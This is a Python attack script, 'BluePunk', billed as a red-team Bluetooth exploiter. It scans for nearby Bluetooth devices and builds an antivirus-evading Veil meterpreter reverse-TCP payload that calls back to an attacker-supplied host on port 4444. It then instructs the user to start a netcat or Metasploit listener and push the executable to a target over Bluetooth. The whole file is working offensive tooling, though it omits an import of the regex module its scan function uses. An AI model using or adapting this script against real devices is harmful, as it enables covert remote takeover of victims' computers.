#!/usr/bin/env python3

import subprocess
import sys
import time
import os
import logging

BLUEPUNK_LOGO = """
   ██████╗ ██╗     ██╗   ██╗███████╗██████╗ ██╗   ██╗███╗   ██╗██╗  ██╗
   ██╔══██╗██║     ██║   ██║██╔════╝██╔══██╗██║   ██║████╗  ██║██║ ██╔╝
   ██████╔╝██║     ██║   ██║█████╗  ██████╔╝██║   ██║██╔██╗ ██║█████╔╝ 
   ██╔══██╗██║     ██║   ██║██╔══╝  ██╔══██╗██║   ██║██║╚██╗██║██╔═██╗ 
   ██████╔╝███████╗╚██████╔╝███████╗██║  ██║╚██████╔╝██║ ╚████║██║  ██╗
   ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
   -----------------------------------------------------------------------
      BLUEPUNK - Red Team Bluetooth Exploiter | Scan & Shell | Kali
   -----------------------------------------------------------------------
"""

logging.basicConfig(filename="bluepunk.log", level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger("BluePunk")

LHOST = input("Enter your public IP or hostname: ").strip()
LPORT = "4444"
PAYLOAD_FILE = "/tmp/bluepunk_veil.exe"

def scan_bluetooth():
    try:
        logger.info("Scanning for Bluetooth devices...")
        result = subprocess.check_output(["hcitool", "scan"], timeout=10).decode()
        devices = re.findall(r"((?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+(.+)", result)
        if not devices:
            raise ValueError("No devices found")
        return devices
    except Exception as e:
        logger.error(f"Bluetooth scan failed: {e}")
        sys.exit(1)

def generate_veil_payload():
    try:
        logger.info(f"Generating Veil payload: {PAYLOAD_FILE}")
        veil_cmd = f"use Evasion\nuse windows/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nset use_arya Y\ngenerate\nset output_file {PAYLOAD_FILE}\nexecute\nexit"
        with open("veil.rc", "w") as f:
            f.write(veil_cmd)
        subprocess.run(["veil", "-r", "veil.rc"], check=True)
        if not os.path.exists(PAYLOAD_FILE):
            raise FileNotFoundError
        logger.info(f"Payload generated: {PAYLOAD_FILE}")
    except Exception as e:
        logger.error(f"Payload generation failed: {e}")
        sys.exit(1)

def main():
    print(BLUEPUNK_LOGO)
    logger.info("BluePunk initialized")
    
    devices = scan_bluetooth()
    print("\nDetected Bluetooth Devices:")
    for i, (mac, name) in enumerate(devices, 1):
        print(f"{i}. MAC: {mac} | Name: {name}")
    
    generate_veil_payload()
    
    print(f"[!] Payload: {PAYLOAD_FILE}")
    print("[!] Start listener: 'nc -lvp 4444' or Metasploit")
    print("[!] Manually deliver payload via Bluetooth (e.g., obexftp) to target")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("User interrupted")
        if os.path.exists("veil.rc"):
            os.remove("veil.rc")
        sys.exit(0)

if __name__ == "__main__":
    main()